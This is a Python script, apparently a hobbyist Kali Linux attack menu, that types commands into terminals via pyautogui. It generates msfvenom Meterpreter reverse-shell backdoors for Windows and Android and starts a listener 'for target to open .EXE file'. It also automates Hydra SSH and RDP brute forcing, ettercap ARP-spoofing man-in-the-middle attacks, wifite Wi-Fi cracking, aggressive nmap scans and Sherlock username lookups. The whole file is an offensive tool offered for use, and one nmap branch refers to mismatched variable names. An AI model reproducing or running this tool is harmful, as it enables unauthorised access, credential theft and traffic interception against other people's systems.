import time
import os
import platform
import pyautogui

os_type = platform.system()

print('* WARNING: THIS PROGRAM WILL WORK WITHOUT ERRORS ON KALI LINUX XFCE, NOT ON GNOME *')
print('Author: Muhammed, Peygamov')
print('''\033[91m
      ),\                                                           /,( 
       /__'.                                                      .'/__
        `)   `'-. \                                             / .-'`   ('
        /   _.--'\ '.          ,               ,          .' /'--._     |
        \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /
         `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`
           )-'`        .'   :||  / -.\ //.- \  ||:   '.        `'-(
          /          .'    / \_ |  /●`^'●\  | _// \    '.        )
           `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('
           /_.'     .-'  _.-'     \ \/^\/ //     `-._  '-.     '.
            '-._' /`            _   \-.-//   _            `\ '_.-'
                `<     _,..--''`|    \`"`/    |`''--..,_     >`
                 _\  ``--..__   \     `'`     /   __..--``  /_
                /  '-.__     ``'-;    / \    ;-'``     __.-'
                '-._    '-._  /    |---|---|    \  _.-'    _.-'
                     `'-._   '/ / / /---|---\ \ \ '   _.-'` 
                             `)` `  /'---'\  ` `(`               
                      /_____/|  / \._\   /_./ \  |\_____                                                               
                                   Version: 3.0
           ''')
print()

def print_colored(text, color_code):
    print("\033[{}m{}\033[0m".format(color_code, text))

def print_green(text):
    print("\033[92m{}\033[0m".format(text))

def telegram_bot():    # menu of options & commands.
    try:
        while True:
            if os_type == 'Linux':
                current_directory = os.getcwd()
                prompt = f"\033[91m┌──(w34p0n㉿r00t)-[null]\n└─# \033[0m"
                print(prompt, end='', flush=True)  # Print the prompt without newline
                menu = input()

                if menu == 'help':
                    help_menu()
                elif menu == 'exit' or menu == 'quit':
                    print('Exiting...')
                    time.sleep(1)
                    exit()
                elif menu == 'clear':
                    os.system('clear')
                    menu_logo()
                elif menu == 'start':
                    start_menu()
                    current_directory = os.getcwd()
                    prompt = f"\033[91m┌──(w34p0n㉿r00t)-[null]\n└─# \033[0m"
                    print(prompt, end='', flush=True)
                    menu = input()

                    if menu == '1' or menu == '01':
                        pyautogui.hotkey('ctrl', 'alt', 't')
                        time.sleep(1)
                        pyautogui.write('msfconsole')
                        pyautogui.press('enter')
                    elif menu == 'clear':
                        os.system('clear')
                        menu_logo()
                    elif menu == '2':
                        pyautogui.hotkey('ctrl', 'alt', 't')
                        time.sleep(0.80)
                        pyautogui.write('sudo apt install arp-scan -y')
                        pyautogui.press('enter')
                        time.sleep(4)
                        pyautogui.write('sudo arp-scan --localnet')
                        pyautogui.press('enter')
                    elif menu == '3':
                        start_msvenom_payload()
                    elif menu == '4':
                        system_clean_up()
                        print('Go to the 3rd column and select all and start cleaning up')
                    elif menu == '5':
                        os_detection()
                    elif menu == '6':
                        nmap_aggressive_windows_attack()
                    elif menu == '7':
                        mitm_attack()
                    elif menu == '8':
                        wifite_attack()
                    elif menu == '9':
                        sherlock_information_gathering()
                    elif menu == '10':
                        nmap_aggresive_attack_to_network()
                    elif menu == '11':
                        aggressive_website_scan()
                    elif menu == '12':
                        ssh_brute_force_attack()
                    elif menu == '13':
                        rdp_brute_force_attack()
                    elif menu == '19':
                        cleanup()
                    elif menu == '20':
                        print('Exiting...')
                        time.sleep(0.80)
                        exit()
                else:
                    print('Type "help" for help')
            elif os_type == 'Windows':
                print('[!] This Version of Program is Not Supported on Windows! Try run it on Linux.')
    except KeyboardInterrupt:
        print("Keyboard interrupt detected! Exiting...")

def start_menu():
    print_skull()
    print()
    print('MENU OF OPTIONS:')
    print()
    print_green('      [01]  Jump to MSFConsole (Metasploit-Framework)')
    print_green('      [02]  Display Connected Clients On The Network')
    print_green('      [03]  Create Backdoor MSFVenom [Detectable]')
    print_green('      [04]  Clean Up Your System')
    print_green('      [05]  Detect Nmap OS Detection')
    print_green('      [06]  Launch Nmap Aggressive Attack (Windows Attack)')
    print_green('      [07]  Perform MiTM Attack')
    print_green('      [08]  Launch Wifite')
    print_green('      [09]  Gather User Information With Sherlock')
    print_green('      [10]  Start Aggressive Nmap Attack To Network')
    print_green('      [11]  Aggressive Website Scan Using Nmap')
    print_green('      [12]  SSH Brute Force Attack [Linux]')
    print_green('      [13]  RDP Brute Force Attack [Windows]')
    print_green('      [19]  Cleanup')
    print_green('      [20]  Exit')
    print()

def rdp_brute_force_attack():
    rdp_ip = input('Enter rdp [Windows] IP: ')

    rdp_wordlist_password = input('Enter Wordlist For Passwords: ')
    rdp_wordlist_username = input('Enter Wordlist For Username: ')
    rdp_hydra_question = input('Do you have hydra installed? (yes/no): ')

    if rdp_hydra_question == 'yes':
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'hydra -V -P {rdp_wordlist_password} -L {rdp_wordlist_username} {rdp_ip} rdp')
        pyautogui.press('enter')
    else:
        ask_for_installation_hydra_rdp = input('Do you wanna install hydra now? (yes/no): ')

        if ask_for_installation_hydra_rdp == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.90)

            pyautogui.write('sudo apt install hydra -y')
            pyautogui.press('enter')
        else:
            exit()

def ssh_brute_force_attack():
    ssh_ip = input('Enter SSH IP: ')

    ssh_wordlist_password = input('Enter Wordlist For Passwords: ')
    ssh_wordlist_username = input('Enter Wordlist For Username: ')
    ssh_hydra_question = input('Do you have hydra installed? (yes/no): ')


    if ssh_hydra_question == 'yes':
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'hydra -V -P {ssh_wordlist_password} -L {ssh_wordlist_username} {ssh_ip} ssh')
        pyautogui.press('enter')
    else:
        ask_for_installation_hydra_ssh = input('Do you wanna install hydra now? (yes/no): ')

        if ask_for_installation_hydra_ssh == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.90)

            pyautogui.write('sudo apt install hydra -y')
            pyautogui.press('enter')
        else:
            exit()

def aggressive_website_scan():
    user_ask_nmap = input('Do you have nmap installed? (yes/no): ')

    if user_ask_nmap == 'yes':
        website_scan = input('(do not type https://) Enter a website to scan : ')
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'nmap -A -T4 {website_scan}')
        pyautogui.press('enter')
    elif user_ask_nmap == 'no':
        user_ask_nmap_to_install = input('Install Nmap Now? (yes/no): ')

        if user_ask_nmap_to_install == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.80)

            pyautogui.write('sudo apt install nmap -y')
            pyautogui.press('enter')
        elif user_ask_nmap_to_install == 'no':
            print('Exiting...')
            time.sleep(0.80)
            exit()

def cleanup():
    pyautogui.hotkey('ctrl', 'alt', 't')
    time.sleep(0.80)

    pyautogui.write('sudo apt update -y && sudo apt upgrade -y && sudo apt autoremove -y && sudo apt clean -y')
    pyautogui.press('enter')

def nmap_aggresive_attack_to_network():
    nmap_question = input('Do you have nmap installed? (yes/no): ')

    if nmap_question == 'yes':
        nmap_target_question = input('Enter Router IP To Attack: ')
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'nmap -T4 -A -v {nmap_target_question}')
        pyautogui.press('enter')
    elif nmap_question == 'no':
        nmap_question_2 = input('Install Nmap Now? (yes/no): ')
    else:
        print('[-] Unknown Command Detected! Type "help" for help')

        if nmap_question_2 == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.80)

            pyautogui.write('sudo apt install nmap -y')
            pyautogui.press('enter')
        elif nmap_question2 == 'no':
            print('Exiting...')
            time.sleep(0.70)
            exit()
        else:
            print('[-] Unknown Command Detected! Type "help" for help')

def menu_logo():
    print('''\033[91m
      ),\                                                           /,( 
       /__'.                                                      .'/__
        `)   `'-. \                                             / .-'`   ('
        /   _.--'\ '.          ,               ,          .' /'--._     |
        \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /
         `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`
           )-'`        .'   :||  / -.\ //.- \  ||:   '.        `'-(
          /          .'    / \_ |  /●`^'●\  | _// \    '.        )
           `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('
           /_.'     .-'  _.-'     \ \/^\/ //     `-._  '-.     '.
            '-._' /`            _   \-.-//   _            `\ '_.-'
                `<     _,..--''`|    \`"`/    |`''--..,_     >`
                 _\  ``--..__   \     `'`     /   __..--``  /_
                /  '-.__     ``'-;    / \    ;-'``     __.-'
                '-._    '-._  /    |---|---|    \  _.-'    _.-'
                     `'-._   '/ / / /---|---\ \ \ '   _.-'` 
                             `)` `  /'---'\  ` `(`               
                      /_____/|  / \._\   /_./ \  |\_____                                                               
                                   Version: 3.0
           ''')

def print_skull():
    print()
    print("	                       .          . ")
    print("	                      /            \      Author: Muhammed, Peygamov")
    print("	                     |,  .-.  .-.  ,|      ")
    print("	                     | )(_ /  \_ )( |")
    print("	                     |/     /\     \|    ")
    print("\033[91m	    (@_      <__    ^^    __>        ")
    print("	      _       \_______\__|IIIIII|__/_____________________ ")
    print("	      (_)\@8@8{}<________________________________________> ")
    print("	              )_/       \ IIIIII /                    ")
    print("	            (@           --------                      ")
    print("\033[96m		                                       ")
    print("\033[91m		               Version: 3.0                              ")

    print()


def sherlock_information_gathering():
    pyautogui.hotkey('ctrl', 'alt', 't')
    time.sleep(0.80)

    pyautogui.write('sudo apt install sherlock -y')
    pyautogui.press('enter')

    print('Answer that Question')
    user_sherlock_ask = input('(Note: Answer the question when sherlock installation will be completed!) Enter the Name To Get Info: ')
    pyautogui.write(f'sherlock {user_sherlock_ask}')
    pyautogui.press('enter')

def wifite_attack():
    user_ask_wifite = input('Do you have wifite/aircrack-ng installed? (yes/no): ')

    if user_ask_wifite == 'yes':
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write('sudo wifite')
        pyautogui.press('enter')
    elif user_ask_wifite == 'no':
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write("sudo apt install wifite -y && sudo apt install aircrack-ng -y")
        pyautogui.press('enter')
    else:
        print('[-] Unknown Command Detected! Type "help" for help')

def mitm_attack():
    pyautogui.hotkey('ctrl', 'alt', 't')
    time.sleep(0.80)

    pyautogui.write('sudo apt install ettercap-text-only -y')
    pyautogui.press('enter')

    time.sleep(2)
    mitm_router = input('Your Router IP: ')
    mitm_ip_target = input('Enter Target IP: ')

    pyautogui.hotkey('ctrl', 'alt', 't')
    time.sleep(0.80)

    pyautogui.write(f'sudo ettercap -T -M arp:remote //{mitm_ip_target}// //{mitm_router}//')
    pyautogui.press('enter')

def nmap_aggressive_windows_attack():
    nmap_installation_ask = input('Do you have Nmap installed? (yes/no): ')

    if nmap_installation_ask == 'yes':
        nmap_ip_windows_ask = input('Enter Windows IP For Aggressive Attack: ')

        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'nmap -A {nmap_ip_windows_ask}')
        pyautogui.press('enter')
    elif nmap_installation_ask == 'no':
        nmap_ask = input('Do you want install nmap now? (yes/no): ')
        if nmap_ask == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.80)

            pyautogui.write('sudo apt install nmap -y')
            pyautogui.press('enter')
        elif nmap_ask == 'no':
            print('Alright, exiting...')
            time.sleep(1)
            exit()
    else:
        print('Unknown Command Detected! Type "help" for help')


def os_detection():
    user_nmap_question = input('Do you have nmap installed? (yes/no): ')

    if user_nmap_question == 'yes':
        nmap_ip_ask = input('Enter Target IP: ')
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'nmap {nmap_ip_ask}')
        pyautogui.press('enter')
        print('If nmap is running, please wait, its scanning for open ports!')

    elif user_nmap_question == 'no':
        print('Please Install Nmap To Perform OS Detection!')
        time.sleep(0.50)
        nmap_install = input('Install Nmap Now? (yes/no): ')

        if nmap_install == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.80)

            pyautogui.write('sudo apt install nmap -y')
            pyautogui.press('enter')

            time.sleep(1)
            print('Now you have installed Nmap!')
    else:
        print('[-] Unknown Command Detected! Type "help" for help')

def system_clean_up():
    pyautogui.hotkey('ctrl', 'alt', 't')
    time.sleep(0.90)

    pyautogui.write('sudo apt install stacer')
    pyautogui.press('enter')

    time.sleep(3)
    pyautogui.write('stacer')
    pyautogui.press('enter')

def help_menu():
    print()
    print("\033[92mstart\033[0m")
    print("\033[91mquit/exit\033[0m")
    print()

def start_msvenom_payload():
    print()
    print_green('[1] windows/meterpreter/reverse_tcp')
    print_green('[2] android/meterpreter/reverse_tcp')
    print_green('[3] windows/meterpreter/reverse_https')
    print()

    payload_ask = input('Payload: ')
    lhost_ask = input('IP: ')
    lport_ask = input('PORT: ')
    payload_name = input('Enter The Payload Name To Create: ')

    if payload_ask == '1':
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost_ask} LPORT={lport_ask} -f exe -o {payload_name}')
        pyautogui.press('enter')

        time.sleep(2)
        listener_ask = input('Do you wanna start listener? (yes/no): ')

        if listener_ask == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.50)
            pyautogui.write('msfconsole')

            pyautogui.press('enter')
            time.sleep(13)

            time.sleep(1)
            pyautogui.write('use exploit/multi/handler')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write('set payload windows/meterpreter/reverse_tcp')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write(f'set LHOST {lhost_ask}')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write(f'set LPORT {lport_ask}')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write('exploit')
            pyautogui.press('enter')

            print('LISTENING FOR TARGET TO OPEN .EXE FILE! DO NOT LOOK UP HERE, LOOK UP TO METASPLOIT')

    elif payload_ask == '2':
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost_ask} LPORT={lport_ask} -f raw -o {payload_name}')
        pyautogui.press('enter')

        time.sleep(2)
        listener_ask = input('Do you wanna start listener? (yes/no): ')

        if listener_ask == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.50)
            pyautogui.write('msfconsole')

            pyautogui.press('enter')
            time.sleep(13)

            time.sleep(1)
            pyautogui.write('use exploit/multi/handler')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write('set payload android/meterpreter/reverse_tcp')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write(f'set LHOST {lhost_ask}')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write(f'set LPORT {lport_ask}')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write('exploit')
            pyautogui.press('enter')

            print('LISTENING FOR TARGET TO OPEN .EXE FILE!')

    elif payload_ask == '3':
        pyautogui.hotkey('ctrl', 'alt', 't')
        time.sleep(0.80)

        pyautogui.write(f'msfvenom -p windows/meterpreter/reverse_https LHOST={lhost_ask} LPORT={lport_ask} -f exe -o {payload_name}')
        pyautogui.press('enter')

        time.sleep(2)
        listener_ask = input('Do you wanna start listener? (yes/no): ')

        if listener_ask == 'yes':
            pyautogui.hotkey('ctrl', 'alt', 't')
            time.sleep(0.50)
            pyautogui.write('msfconsole')

            pyautogui.press('enter')
            time.sleep(13)

            time.sleep(1)
            pyautogui.write('use exploit/multi/handler')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write('set payload windows/meterpreter/reverse_https')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write(f'set LHOST {lhost_ask}')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write(f'set LPORT {lport_ask}')
            pyautogui.press('enter')

            time.sleep(1)
            pyautogui.write('exploit')
            pyautogui.press('enter')

            print('LISTENING FOR TARGET TO OPEN .EXE or .APK FILE!')

    else:
        print('Invalid option for payload!')

telegram_bot()
print_green('')
